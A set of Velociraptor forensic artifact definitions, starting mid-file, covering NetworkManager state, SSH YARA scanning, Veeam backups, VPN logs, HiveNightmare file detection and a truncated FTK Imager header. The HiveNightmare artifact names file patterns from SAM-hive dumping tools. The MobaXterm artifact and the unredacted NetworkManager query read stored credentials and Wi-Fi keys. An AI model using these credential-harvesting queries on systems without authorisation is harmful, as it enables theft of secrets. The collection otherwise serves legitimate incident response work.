        FROM scope()

column_types:
  - name: LastActivated
    type: timestamp
    description: |
        When the connection was last fully successfully activated. This
        timestamp may be updated periodically while the connection is active.

precondition: |
    SELECT OS FROM info() WHERE OS = 'linux'

sources:
  - name: State
    description: |
        NetworkManager have three states that may be toggled:
        NetworkingEnabled, which disables all networking (managed by
        NetworkManager); WirelessEnabled, which disables wireless networking;
        and WWANEnabled, which disables mobile data connections.
    query: |
        LET State_ = SELECT parse_string_with_regex(string=Data,
        regex=('''NetworkingEnabled=(?P<NetworkingEnabled>\S+)''',
            '''WirelessEnabled=(?P<WirelessEnabled>\S+)''',
            '''WWANEnabled=(?P<WWANEnabled>\S+)''')) AS Fields
        FROM read_file(filenames='/var/lib/NetworkManager/NetworkManager.state')

        LET State = SELECT Fields.NetworkingEnabled AS NetworkingEnabled,
            Fields.WirelessEnabled AS WirelessEnabled,
            Fields.WWANEnabled AS WWANEnabled
            FROM State_

        SELECT * FROM State

  - name: ConnectionConfigs
    description: |
        All connections configured in NetworkManager. Columns returned are
        OSPath and a dict with the connection configuration.
    query: |
        LET ConfiguredConnections <= SELECT * FROM foreach(row={
            SELECT OSPath FROM glob(globs='/etc/NetworkManager/system-connections/*.nmconnection')
            }, query=if(condition=RedactSecrets, then={
                SELECT OSPath,
                    Contents + dict(`wifi-security/psk`='<REDACTED>')
                        AS Contents
                    FROM parse_ini_as_dict(filename=OSPath)
            }, else={
                SELECT *, OSPath FROM parse_ini_as_dict(filename=OSPath)
            })
        )

        SELECT OSPath, Contents FROM ConfiguredConnections

  - name: Connections
    description: |
        Return a handful of useful properties from ConnectionConfigs in a
        more readable table with individual column names: Name, UUID, Type,
        Device and LastActivated. LastActivated are fetched from another
        state file and combined with the results from ConnectionConfigs.
    query: |
        LET Timestamps = SELECT UUID, if(condition=parse_float(string=Timestamp),
            then=timestamp(epoch=Timestamp), else=null) AS Timestamp
            FROM parse_records_with_regex(file='/var/lib/NetworkManager/timestamps',
                regex='''(?P<UUID>[-A-Fa-f0-9]+)+=(?P<Timestamp>\S+)''')

        LET Connections <= SELECT Name, _UUID AS UUID, Type, Device, LastActivated
            FROM foreach(row={
                SELECT * FROM ConfiguredConnections
                }, query={
                    SELECT Contents.`connection/id` AS Name,
                        Contents.`connection/uuid` AS _UUID,
                        Contents.`connection/type` AS Type,
                        Contents.`connection/interface-name` AS Device,
                        Timestamp AS LastActivated
                    FROM Timestamps
                    WHERE _UUID=UUID
            })

        SELECT * FROM Connections

  - name: ActiveConnections
    description: |
        Return connections from Connections that are currently active,
        by asking the NetworkManager daemon through the utility "nmcli".
    query: |
        LET nmcli = SELECT Stdout
            FROM execve(argv=['nmcli', '-t', '-f', 'uuid', 'connection', 'show', '--active'])

        LET ActiveConnections = SELECT * FROM foreach(row={
            SELECT * FROM parse_lines(accessor='data',
                filename=nmcli.Stdout)
            }, query={
                SELECT * FROM Connections WHERE UUID=Line
            })

        SELECT * FROM ActiveConnections

  - name: DeviceStatus
    description: |
        Ask NetworkManager through "nmcli" about the status of all network
        interfaces, managed as well unmanaged, with detailed information such
        as IP addresses, routes, MTU and DNS settings.
    query: |
        LET nmcli = SELECT Stdout
            FROM execve(argv=['nmcli', '-t', 'device', 'show'])

        LET DeviceStatus = SELECT * FROM foreach(row=split(sep='\n\n',
            string=nmcli.Stdout), query={
                SELECT parse_string_with_regex(string=_value,
                    regex='''GENERAL.DEVICE:(?P<Device>.+)''').Device AS Device,
                    to_dict(item={
                        SELECT Key AS _key, Value AS _value
                            FROM parse_records_with_regex(file=_value, accessor='data',
                                regex='^\n?(?P<Key>[^:]+):(?P<Value>.*)')
                    }) AS Status
                    FROM scope()
            })

        /* We're pretty much done now, but the output could be a lot nicer to
           work with. */

        LET S = scope()
        LET Status <= SELECT * FROM foreach(row={SELECT * FROM DeviceStatus},
            column='Status')

        LET to_array(col, dev) = filter(list=array(a={
            SELECT * FROM column_filter(include=col, query={
                SELECT * FROM Status WHERE `GENERAL.DEVICE` = dev
            })}), condition='x=>x')

        LET prettify_route(col, dev) = SELECT *
            FROM foreach(row=to_array(dev=dev, col=col), query={
                SELECT S.Dest AS Dest, S.NextHop AS NextHop, int(int=S.Metric) AS Metric
                FROM foreach(row={
                    SELECT parse_string_with_regex(string=S._value, regex=(
                        '''dst\s*=\s*(?P<Dest>[^,]+)''',
                        '''nh\s*=\s*(?P<NextHop>[^,]+)''',
                        '''mt\s*=\s*(?P<Metric>\d+)''')) AS R
                        FROM scope()
                    }, column='R')
                })
                WHERE Dest

        SELECT `GENERAL.DEVICE` AS Device,
            S.`GENERAL.TYPE` AS Type,
            S.`GENERAL.CONNECTION` AS Connection,
            S.`GENERAL.STATE` AS State,
            S.`GENERAL.HWADDR` AS Mac,
            S.`GENERAL.MTU` AS MTU,
            to_array(dev=`GENERAL.DEVICE`, col='IP4.ADDRESS') AS Addresses,
            prettify_route(dev=`GENERAL.DEVICE`, col='IP4.ROUTE') AS Routes,
            S.`IP4.GATEWAY` AS Gateway,
            to_array(dev=`GENERAL.DEVICE`, col='IP4.DNS') AS DNSServers,
            to_array(dev=`GENERAL.DEVICE`, col='IP4.DOMAIN') AS DNSDomains,
            to_array(dev=`GENERAL.DEVICE`, col='IP4.SEARCHES') AS DNSSearches,
            to_array(dev=`GENERAL.DEVICE`, col='IP6.ADDRESS') AS _IPv6Addresses,
            prettify_route(dev=`GENERAL.DEVICE`, col='IP6.ROUTE') AS _IPv6Routes,
            S.`IP6.GATEWAY` AS _IPv6Gateway,
            to_array(dev=`GENERAL.DEVICE`, col='IP6.DNS') AS _IPv6DNSServers,
            to_array(dev=`GENERAL.DEVICE`, col='IP6.DOMAIN') AS _IPv6DNSDomains,
            to_array(dev=`GENERAL.DEVICE`, col='IP6.SEARCHES') AS _IPv6DNSSearches
            FROM Status

  - name: AvailableAccessPoints
    description: |
        Ask NetworkManager through "nmcli" about details about all available
        Wi-Fi access points
    query: |
        LET nmcli = SELECT Stdout
            FROM execve(argv=['nmcli', '-t', '-m', 'multiline', '-f',
                'ssid,bssid,mode,chan,freq,rate,signal,security,wpa-flags,rsn-flags,device,active,in-use',
                'device', 'wifi', 'list'])

        LET AccessPoints = SELECT * FROM foreach(row=filter(list=split(sep='\x01\x02',
                /* Separate sections of key–values by injecting a blob and then
                   split on that string. nmcli also has a "tabular" output mode,
                   but ":", the separator, is also part of the output and is
                   "escaped" by "/", making the parsing difficult. */
                string=regex_replace(source=nmcli.Stdout, re='(?m)^IN-USE:.*$',
                    replace='$0\x01\x02')), regex='.'), query={

                SELECT to_dict(item={
                    SELECT Key AS _key, Value as _value FROM parse_records_with_regex(
                        file=_value, accessor='data', regex='^\n?(?P<Key>[^:]+):(?P<Value>.*)')
                }) AS Contents FROM scope() WHERE _value
            })
            WHERE Contents

        SELECT DEVICE AS Device, SSID, BSSID, MODE AS Mode, CHAN AS Chan,
            FREQ AS Freq, RATE AS Rate, SIGNAL AS Signal, SECURITY AS Security,
            ACTIVE='yes' AS Active, `WPA-FLAGS` AS WPAFlags, `RSN-FLAGS` AS RSNFlags,
            `IN-USE`='*' AS InUse
            FROM foreach(row=AccessPoints, column='Contents')

  - name: SeenBSSIDs
    description: |
        A list of BSSIDs (each BSSID formatted as a MAC address like
        "00:11:22:33:44:55") that have been detected as part of the Wi-Fi
        network. NetworkManager internally tracks previously seen BSSIDs.
    query: |
        LET SeenBSSIDs <= SELECT UUID AS _UUID, filter(list=split(sep_string=',', string=BSSIDs),
            regex='.+') AS BSSIDs
            FROM parse_records_with_regex(file='/var/lib/NetworkManager/seen-bssids',
                regex='''(?P<UUID>[-A-Fa-f0-9]+)+=(?P<BSSIDs>\S+)''')

        SELECT * FROM foreach(row=SeenBSSIDs, query={
            SELECT Name, UUID, Device, BSSIDs FROM Connections
            WHERE _UUID=UUID
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/SSHYara.yaml
======
name: Generic.Detection.Yara.SSH
author: Matt Green - @mgreen27
description: |
  This is a server artifact that enables running Generic.Detection.Yara.Glob 
  over ssh.
  
  This artifact can be used to run against a single server or against a list of 
  servers via notebook foreach.
  
  Keys are passed as path on disk to preserve potential key leakage. You can also 
  modify the artifact to allow server_metadata to be passed.


type: SERVER
parameters:
  - name: TargetHost
    description: Target SSH host in the format <hostname or IP>:<port>
  - name: TargetUsername
    description: SSH Username to connect - e.g ubuntu
  - name: TargetKey
    description: SSH key path as Velociraptor server metadata or path on disk.
  - name: PathGlob
    description: Only file names that match this glob will be scanned.
    default: /usr/bin/ls
  - name: SizeMax
    description: maximum size of target file.
    type: int64
  - name: SizeMin
    description: minimum size of target file.
    type: int64
  - name: UploadHits
    type: bool
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: YaraRule
    type: yara
    description: Final Yara option and the default if no other options provided.
    default: |
        rule IsELF:TestRule {
           meta:
              author = "the internet"
              date = "2021-05-03"
              description = "A simple ELF rule to test yara features"
          condition:
             uint32(0) == 0x464c457f
        }
  - name: NumberOfHits
    description: This artifact will stop by default at one hit. This setting allows additional hits
    default: 1
    type: int
  - name: ContextBytes
    description: Include this amount of bytes around hit as context.
    default: 0
    type: int

sources:
  - query: |
      LET SSH_CONFIG <= dict(
            hostname= TargetHost,
            username= TargetUsername,
            private_key= read_file(filename=TargetKey)
        )

      LET _ <= remap(config='''
        remappings:
          - type: mount
            from:
             accessor: ssh
            on:
             accessor: auto
        ''')

      SELECT * FROM Artifact.Generic.Detection.Yara.Glob(
                PathGlob=PathGlob,
                YaraRule=YaraRule,
                NumberOfHits=NumberOfHits,
                ContextBytes=ContextBytes,
                SizeMax=SizeMax,
                SizeMin=SizeMin,
                UploadHits=UploadHits,
                DateAfter=DateAfter,
                DateBefore=DateBefore
            )

column_types:
  - name: HitContext
    type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Veeam.RestorePoints.BackupFiles.yaml
======
name: Windows.Veeam.RestorePoints.BackupFiles

description: |
  Parses the metadata found in Veeam full backup files (`.vbk`), Veeam incremental backup files (`.vib`) and Veeam reverse incremental backup files (`.vrb`) to extract relevant fields for each Restore Point.
  
  These files are generated by Veeam Backup & Replication during backup jobs. This artifact accepts full backup, incremental backup, and reverse incremental backup files from **unencrypted** backups of virtual and physical infrastructures.

author: Synacktiv, Maxence Fossat - @cybiosity

type: CLIENT

precondition: SELECT OS FROM info() WHERE OS = 'windows'

parameters:
  - name: BackupRepositories
    description: List of Backup Repositories where ".vbk", ".vib" and ".vrb" files should be looked for.
    type: csv
    default: |
      BackupRepoPath
      C:/BackupRepo1
      D:/BackupRepo2

required_permissions:
  - FILESYSTEM_READ

sources:
  - query: |
      // ============================
      // === Formatting functions ===
      // ============================
      
      // Function to format XML properties
      LET format_properties(Properties) = to_dict(item={ 
          SELECT AttrName AS _key,
                 Value AS _value
            FROM Properties
      })

      // Function to format disk_info capacity for HvAuxData
      LET hv_disk_capacity(Disks) = to_dict(item= {
          SELECT disk_info.Attrdisk_id AS _key,
                 disk_info.Attrcapacity AS _value
            FROM Disks
      })
      
      // Function to format Disk capacity for DesktopOibAuxData
      LET desktop_disk_capacity(Disks) = to_dict(item= {
          SELECT DevSetupInfo.AttrDevPath AS _key,
                 Capacity AS _value
            FROM Disks
      })
      
      // Function to format Disk capacity for COibAuxDataVmware
      LET vmware_disk_capacity(Disks) = to_dict(item= {
          SELECT `Uuid` AS _key,
                 Capacity AS _value
            FROM Disks
      })
      
      // Function to format OibFiles
      LET oib_files_size(Files) = to_dict(item= {
          SELECT AttrFileName AS _key,
                 AttrSize AS _value
            FROM Files
      })
      
      // Restore Point type
      LET restore_point_type = dict(
          `0`='Full',
          `1`='Increment'
      )
      
      // Backup encryption state
      LET back_enc_state = dict(
          `0`='Unencrypted',
          `2`='Encrypted'
      )
  
      // ========================
      // === Initial parsing ====
      // ========================
      
      LET MetadataStart <= '''
      rule StartOffsetRule {
          strings:
              $start = "<OibSummary>"
          condition: any of them
      }
      '''
      LET MetadataEnd <= '''
      rule EndOffsetRule {
          strings:
              $end = "</OibSummary>"
          condition: any of them
      }
      '''
      
      // Listing all Storage files in the Backup Repositories
      LET backup_repos = SELECT BackupRepoPath FROM BackupRepositories
      LET backup_files = SELECT * FROM foreach(row=backup_repos,
          query={
              SELECT *
                FROM glob(
                    globs=[
                        '/**/*.vbk',
                        '/**/*.vib',
                        '/**/*.vrb'
                    ],
                    root=BackupRepoPath,
                    accessor='file'
                )
          })
      
      // Find last start offset of metadata for each Storage file
      LET start_offsets= SELECT File.FullPath AS FilePath,
             max(item=String.Offset) AS StartOffset
        FROM yara(
            files=backup_files.OSPath,
            rules=MetadataStart,
            start=0,
            end=18446744073709551615,
            number=100
        )
        GROUP BY File.FullPath
        
      // Find end offset for each start offset, extract and parse XML
      LET xml = SELECT parse_xml(
          accessor='data',
          file=read_file(
              filename=BackupFilePath,
              offset=StartOffset,
              length=EndOffset - StartOffset + 13
          )
      ) AS Metadata,
      BackupFilePath
        FROM foreach(row=start_offsets,
        query={
            SELECT File.FullPath AS BackupFilePath,
                   StartOffset,
                   String.Offset + StartOffset AS EndOffset
              FROM yara(
                  files=pathspec(
                      DelegateAccessor='file',
                      DelegatePath=FilePath,
                      Path=str(str=StartOffset)
                  ),
                  accessor='offset',
                  rules=MetadataEnd,
                  end=20971520,
                  number=1
              )
        })
        WHERE Metadata

      // =========================      
      // === Objects In Backup ===
      // =========================

      // Extracting interesting fields from OIB, OibFiles, Object, SourceHost, Storage, Point and Backup
      LET oib = SELECT BackupFilePath, 
              Metadata.OibSummary.OIB.AttrDisplayName AS DisplayName,
              Metadata.OibSummary.OIB.AttrVmName AS VMName,
              Metadata.OibSummary.OIB.AttrState AS State,
              Metadata.OibSummary.OIB.AttrType AS Type,
              Metadata.OibSummary.OIB.AttrAlgorithm AS Algorithm,
              Metadata.OibSummary.OIB.AttrHealthStatus AS HealthStatus,
              Metadata.OibSummary.OIB.AttrHasIndex AS HasIndex,
              Metadata.OibSummary.OIB.AttrHasExchange AS HasExchange,
              Metadata.OibSummary.OIB.AttrHasSharePoint AS HasSharePoint,
              Metadata.OibSummary.OIB.AttrHasSql AS HasSQL,
              Metadata.OibSummary.OIB.AttrHasAd AS HasAD,
              Metadata.OibSummary.OIB.AttrHasOracle AS HasOracle,
              Metadata.OibSummary.OIB.AttrHasPostgreSql AS HasPostgreSQL,
              Metadata.OibSummary.OIB.AttrHasVeeamArchiver AS HasVeeamArchiver,
              Metadata.OibSummary.OIB.AttrIsCorrupted AS IsCorrupted,
              Metadata.OibSummary.OIB.AttrIsRecheckCorrupted AS IsRecheckCorrupted,
              Metadata.OibSummary.OIB.AttrIsConsistent AS IsConsistent,
              Metadata.OibSummary.OIB.AttrIsPartialActiveFull AS IsPartialActiveFull,
              Metadata.OibSummary.OIB.AttrProductVersion AS ProductVersion,
              Metadata.OibSummary.OIB.AttrProductVersionFlags AS ProductVersionFlags,
              Metadata.OibSummary.OIB.AttrProductIsRentalLicense AS ProductIsRentalLicense,
              Metadata.OibSummary.SourceHost.AttrName AS HostName,
              Metadata.OibSummary.SourceHost.AttrHostInstanceId AS HostInstanceID,
              Metadata.OibSummary.Backup.AttrJobName AS JobName,
              Metadata.OibSummary.Backup.AttrPolicyName AS PolicyName,
              Metadata.OibSummary.PrevFileName AS PreviousFileInChain,
              back_enc_state[Metadata.OibSummary.Backup.AttrEncryptionState] AS BackupEncryptionState,
              Metadata.OibSummary.OIB.AttrEffectiveMemoryMb AS TempMemory,
              Metadata.OibSummary.Object.AttrViType || 'Physical machine' AS VirtualType,
              Metadata.OibSummary.Object.AttrName AS ExtractName,
              Metadata.OibSummary.Object.AttrObjectId AS ExtractID,
              oib_files_size(Files=Metadata.OibSummary.OibFiles.File) AS ExtractableFilesSize,
              parse_xml(file=Metadata.OibSummary.Storage.AttrPartialPath, accessor='data').Path.Elements AS BackupFile,
              timestamp(string=Metadata.OibSummary.OIB.AttrCreationTimeUtc) AS CreationTimeUTC,
              timestamp(string=Metadata.OibSummary.OIB.AttrCompletionTimeUtc) AS CompletionTimeUTC,
              humanize(bytes=int(int=Metadata.OibSummary.OIB.AttrApproxSize)) AS ApproximateSize,
              split(string=Metadata.OibSummary.Point.AttrNum, sep='\\.')[0] AS RestorePointNumber,
              restore_point_type[Metadata.OibSummary.Point.AttrType] AS RestorePointType,
              parse_xml(file=Metadata.OibSummary.Storage.`#text`, accessor='data').CBackupStats AS Stats,
              parse_xml(file=Metadata.OibSummary.OIB.AttrAuxData, accessor='data').COibAuxData AS AuxData,
              format_properties(
                  Properties = parse_xml(file=Metadata.OibSummary.OIB.`#text`, accessor='data').GuestInfo.Property
              ) AS GuestInfo
        FROM xml
      
      // Expanding relevant fields into subfields
      LET expand_oib = SELECT BackupFilePath, DisplayName, VMName, State, Type, Algorithm, HealthStatus, HasIndex, HasExchange, HasSharePoint, HasSQL, HasAD, HasOracle, HasPostgreSQL, HasVeeamArchiver, IsCorrupted, IsRecheckCorrupted, IsConsistent, IsPartialActiveFull, ProductVersion, ProductVersionFlags, ProductIsRentalLicense, HostName, HostInstanceID, JobName, PolicyName, PreviousFileInChain, BackupEncryptionState, VirtualType, ExtractName, ExtractID, ExtractableFilesSize, BackupFile, CreationTimeUTC, CompletionTimeUTC, ApproximateSize, RestorePointNumber, RestorePointType,
              format(
                  format='%d MiB',
                  args = int(int=TempMemory) || int(int=AuxData.DesktopOibAuxData.SystemConfiguration.RAMInfo.AttrTotalSizeMB)
              ) AS Memory,
              hv_disk_capacity(Disks=AuxData.HvAuxData.disks.disk)
                + desktop_disk_capacity(Disks=AuxData.DesktopOibAuxData.Disk)
                + vmware_disk_capacity(Disks=AuxData.COibAuxDataVmware.Disk)
                AS DisksCapacity,
              GuestInfo.GuestOsName AS GuestOSName,
              GuestInfo.GuestOsType AS GuestOSType,
              GuestInfo.DnsName AS GuestDNSName,
              GuestInfo.`Ip` AS GuestIP,
              GuestInfo.ToolsStatus AS GuestToolsStatus,
              GuestInfo.ToolsVersionStatus AS GuestToolsVersionStatus,
              Stats.BackupSize AS BackupSize,
              Stats.DataSize AS DataSize,
              Stats.DedupRatio AS DeduplicationRatio,
              Stats.CompressRatio AS CompressionRatio
        FROM oib
        
      // ===================
      // === Final query ===
      // ===================
      
      SELECT DisplayName,
             CreationTimeUTC,
             CompletionTimeUTC,
             ApproximateSize,
             DisksCapacity,
             RestorePointNumber,
             RestorePointType,
             HostName,
             HostInstanceID,
             BackupFile,
             BackupFilePath,
             ExtractableFilesSize,
             BackupSize,
             DataSize,
             DeduplicationRatio,
             CompressionRatio,
             VirtualType,
             VMName,
             Memory,
             GuestOSName,
             GuestOSType,
             GuestDNSName,
             GuestIP,
             GuestToolsStatus,
             GuestToolsVersionStatus,
             State,
             Type,
             Algorithm,
             HealthStatus,
             HasIndex,
             HasExchange,
             HasSharePoint,
             HasSQL,
             HasAD,
             HasOracle,
             HasPostgreSQL,
             HasVeeamArchiver,
             IsCorrupted,
             IsRecheckCorrupted,
             IsConsistent,
             IsPartialActiveFull,
             ProductVersion,
             ProductVersionFlags,
             ProductIsRentalLicense,
             JobName,
             PolicyName,
             BackupEncryptionState,
             PreviousFileInChain,
             ExtractName,
             ExtractID
        FROM expand_oib

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.RemoteAccessVPN.yaml
======
name: Windows.EventLogs.RemoteAccessVPN
author: Théo Letailleur, Synacktiv 
description: |
  This Artifact enables scoping EventLogs from Microsoft VPN, served by 
  Remote Access Service server role. 
  It is designed to assist in identifying VPN connections on organizations that 
  are using Microsoft VPN service. It targets both server and client side logs.
  
  This artifact parses EvtxHunter output and returns a set of fields in results.
  An unparsed data field is availible in the hidden _RawData field.
  
  There are several parameter's available for search leveraging regex.  
  
    - ClientEvtxGlob glob of VPN Client EventLogs to target. Default to Application.evtx.  
    - ServerEvtxGlob glob of VPN Server EventLogs to target. Default to System.evtx.
    - NPSLogsGlob glob of NPS Server Text Logs to target.
    - dateAfter enables search for events after this date.  
    - dateBefore enables search for events before this date.
    - IocRegex enables regex search over the message field.
    - IgnoreRegex enables a regex whitelist for the Message field.  
    - SearchVSS enables searching over VSS.  
    

reference:
    - https://www.synacktiv.com/publications/forensic-aspects-of-microsoft-remote-access-vpn.html
    - https://learn.microsoft.com/en-us/windows-server/remote/remote-access/remote-access

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: ClientEvtxGlob
    default: '%SystemRoot%\System32\Winevt\Logs\Application.evtx'
    description: "EVTX file path glob where RAS Client logs are stored"
  - name: ServerEvtxGlob
    default: '%SystemRoot%\System32\Winevt\Logs\System.evtx'
    description: "EVTX file path glob where RAS Server logs are stored"
  - name: NPSLogsGlob
    default: '%SystemRoot%\System32\LogFiles\IN*'
  - name: IocRegex
    default: .
    type: regex
  - name: IgnoreRegex
    description: "Regex of string to whitelist"
    type: regex
  - name: SearchVSS
    description: "Add VSS into query."
    type: bool
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"

sources:
  - name: VPN Server
    description: VPN Server event logs
    query: |
      LET VPNServerIdRegex = '^(20250|20253|20255|20271|20272|20274|20275)$'

       -- User
      LET extract_user(eventid, eventdata) =
                if(condition=eventid=20271,then=format(format='''%v''', args=[eventdata[1]]), else=
                if(condition=(eventid=20250 OR eventid=20253 OR eventid=20255 OR eventid=20272 OR eventid=20274),then=format(format='''%v''', args=[eventdata[2]]), else=
                if(condition=eventid=20275,then="N/A")
            ))      
    
      -- TunnelIP
      LET extract_tunnelip(eventid, eventdata) =
                if(condition=eventid=20274,then=format(format='''%v''', args=[eventdata[4]]), else=
                if(condition=eventid=20275,then=format(format='''%v''', args=[eventdata[2]])
            ))  

      -- ExternalIP
      LET extract_externalip(eventid, eventdata) =
                if(condition=eventid=20271,then=format(format='''%v''', args=[eventdata[2]]))
    
      SELECT EventTime,Computer,Channel,Provider,EventID,extract_user(eventid=EventID,eventdata=EventData.Data) as User, extract_tunnelip(eventid=EventID, eventdata=EventData.Data) as TunnelIP, extract_externalip(eventid=EventID, eventdata=EventData.Data) as ExternalIP, EventData.Data[1:] as ExtraInfo,Message,EventData.Data as _RawData
      FROM Artifact.Windows.EventLogs.EvtxHunter(
                        EvtxGlob=ServerEvtxGlob,
                        IocRegex=IocRegex,
                        IdRegex=VPNServerIdRegex,
                        WhitelistRegex=IgnoreRegex,
                        DateAfter=DateAfter,
                        DateBefore=DateBefore, 
                        SearchVSS=SearchVSS )

  - name: VPN Clients
    description: VPN Client event logs
    query: |
      LET VPNClientIdRegex = '^(20220|20221|20222|20223|20224|20225|20226|20227)$'

      SELECT EventTime,Computer,Channel,Provider,EventID,EventData.Data[1] as User, EventData.Data[2:] as ExtraInfo,Message,EventData.Data as _RawData
      FROM Artifact.Windows.EventLogs.EvtxHunter(
                        EvtxGlob=ClientEvtxGlob,
                        IocRegex=IocRegex,
                        IdRegex=VPNClientIdRegex,
                        WhitelistRegex=IgnoreRegex,
                        DateAfter=DateAfter,
                        DateBefore=DateBefore, 
                        SearchVSS=SearchVSS )    

  - name: NPS Server
    description: Retrieve NPS Server logs (also available in the Microsoft VPN server)
    query: |
        SELECT * FROM foreach(
           row={
              SELECT FullPath FROM glob(globs=expand(path=NPSLogsGlob))
           },
           query={
               SELECT * from parse_csv(filename=FullPath, columns=["ComputerName","ServiceName","Record-Date","Record-Time","Packet-Type","User-Name","Fully-Qualified-Distinguished-Name","Called-Station-ID","Calling-Station-ID","Callback-Number","Framed-IP-Address","NAS-Identifier","NAS-IP-Address","NAS-Port","Client-Vendor","Client-IP-Address","Client-Friendly-Name","Event-Timestamp","Port-Limit","NAS-Port-Type","Connect-Info","Framed-Protocol","Service-Type","Authentication-Type","Policy-Name","Reason-Code","Class","Session-Timeout","Idle-Timeout","Termination-Action","EAP-Friendly-Name","Acct-Status-Type","Acct-Delay-Time","Acct-Input-Octets","Acct-Output-Octets","Acct-Session-Id","Acct-Authentic","Acct-Session-Time","Acct-Input-Packets","Acct-Output-Packets","Acct-Terminate-Cause","Acct-Multi-Ssn-ID","Acct-Link-Count","Acct-Interim-Interval","Tunnel-Type","Tunnel-Medium-Type","Tunnel-Client-Endpt","Tunnel-Server-Endpt","Acct-Tunnel-Conn","Tunnel-Pvt-Group-ID","Tunnel-Assignment-ID","Tunnel-Preference","MS-Acct-Auth-Type","MS-Acct-EAP-Type","MS-RAS-Version","MS-RAS-Vendor","MS-CHAP-Error","MS-CHAP-Domain","MS-MPPE-Encryption-Types","MS-MPPE-Encryption-Policy","Proxy-Policy-Name","Provider-Type","Provider-Name","Remote-Server-Address","MS-RAS-Client-Name","MS-RAS-Client-Version"])
           })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.NTFS.MFT.HiveNightmare.yaml
======
name: Windows.NTFS.MFT.HiveNightmare
description: |
  This artifact uses Windows.NTFS.MFT (By Matt Green - @mgreen27) to
  find several files created as part of the POC tooling for
  HiveNightmare (CVE-2021-36934):

    - \hive_sam_ - https://github.com/FireFart/hivenightmare
    - \SAM-20 - https://github.com/GossiTheDog/HiveNightmare
    - \SAM-haxx - https://github.com/GossiTheDog/HiveNightmare
    - \Sam.save - PowerShell version
    - \Sam.hive - https://github.com/WiredPulse/Invoke-HiveNightmare
    - C:\windows\temp\sam - https://github.com/cube0x0/CVE-2021-36934

  See Florian Roth's rule here:
  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/win_hivenightmare_file_exports.yml

author: "Zach Stanford - @svch0st"

parameters:
  - name: MFTFilename
    default: "C:/$MFT"
  - name: Accessor
    default: ntfs
  - name: PathRegex
    description: "Regex search over FullPath."
    default: "Windows/Temp/sam$"
  - name: FileRegex
    description: "Regex search over File Name"
    default: "^(hive_sam_|SAM-2021-|SAM-2022-|SAM-haxx$|Sam.save$|Sam.hive$)"
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: SizeMax
    type: int64
    description: "Entries in the MFT under this size in bytes."
  - name: SizeMin
    type: int64
    description: "Entries in the MFT over this size in bytes."
  - name: AllDrives
    type: bool
    description: "Select MFT search on all attached ntfs drives."


sources:
  - query: |
      -- firstly set timebounds for performance
      LET DateAfterTime <= if(condition=DateAfter,
            then=DateAfter, else="1600-01-01")
      LET DateBeforeTime <= if(condition=DateBefore,
            then=DateBefore, else="2200-01-01")
      -- find all ntfs drives
      LET ntfs_drives = SELECT FullPath + '/$MFT'as Path
        FROM glob(globs="/*", accessor="ntfs")
      -- function returning MFT entries
      LET mftsearch(MFTPath) = SELECT EntryNumber,InUse,ParentEntryNumber,
            MFTPath,FullPath,FileName,FileSize,ReferenceCount,IsDir,
            Created0x10,Created0x30,LastModified0x10,LastModified0x30,
            LastRecordChange0x10,LastRecordChange0x30,LastAccess0x10,LastAccess0x30
        FROM parse_mft(filename=MFTPath, accessor=Accessor)
        WHERE FullPath =~ PathRegex  OR FileName =~ FileRegex
            AND Created0x10 < DateBeforeTime
            AND Created0x10 > DateAfterTime
            AND Created0x30 < DateBeforeTime
            AND Created0x30 > DateAfterTime
            AND LastModified0x10 < DateBeforeTime
            AND LastModified0x10 > DateAfterTime
            AND LastModified0x30 < DateBeforeTime
            AND LastModified0x30 > DateAfterTime
            AND LastRecordChange0x10 < DateBeforeTime
            AND LastRecordChange0x10 > DateAfterTime
            AND LastRecordChange0x30 < DateBeforeTime
            AND LastRecordChange0x30 > DateAfterTime
            AND LastAccess0x10 < DateBeforeTime
            AND LastAccess0x10 > DateAfterTime
            AND LastAccess0x30 < DateBeforeTime
            AND LastAccess0x30 > DateAfterTime
            AND if(condition=SizeMax,
                then=FileSize < atoi(string=SizeMax),
                else=TRUE)
            AND if(condition=SizeMin,
                then=FileSize > atoi(string=SizeMin),
                else=TRUE)
      -- include all attached drives
      LET all_drives = SELECT * FROM foreach(row=ntfs_drives,
            query={
                SELECT *
                FROM mftsearch(MFTPath=Path)
                WHERE log(message="Processing " + Path)
              })
      -- return rows
      SELECT * FROM if(condition=AllDrives,
        then= all_drives,
        else= {
           SELECT * FROM mftsearch(MFTPath=MFTFilename)
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Custom.Windows.MobaXterm.Passwords.yaml
======
name: Windows.MobaXterm.Passwords
author: "Yaron King - @Sam0rai"
description: |
   Extract MobaXterm encrypted saved Master Passwords, Passwords and Credentials from registry.
   Further information regarding decryption can be found here: https://www.xmcyber.com/blog/extracting-encrypted-credentials-from-common-tools-2/

type: CLIENT

precondition:
  SELECT * FROM info() where OS = 'windows'

parameters:
  - name: SearchRegistryGlob
    default: HKEY_USERS\\S-1-5-21-*\\SOFTWARE\\Mobatek\MobaXterm\\{M,P,C}\\**
    description: Use a glob to define the registry path to search for saved (M)aster passwords, (P)asswords and (C)redentials.

sources:
  - query: |
        SELECT Data.value as EncryptedCreds, FullPath, ModTime
        FROM glob(globs=SearchRegistryGlob, accessor='reg')

---END OF FILE---

======
FILE: /content/exchange/artifacts/FTKImager.yaml
======
name: Windows.Applications.FTKImager
description: |
    Create an E01 Image of the C drive using FTK Imager (Command Line
    Version)

    SourceDriveToImage usually will be 0 (as in \\.\PHYSICALDRIVE0)
    for the C: drive, on a Windows system.

    If you intend to image the secondary drive, use, for example,
    SourceDriveToImage = 1, for \\.\PHYSICALDRIVE1

author: Eduardo Mattos - @eduardfir

reference:
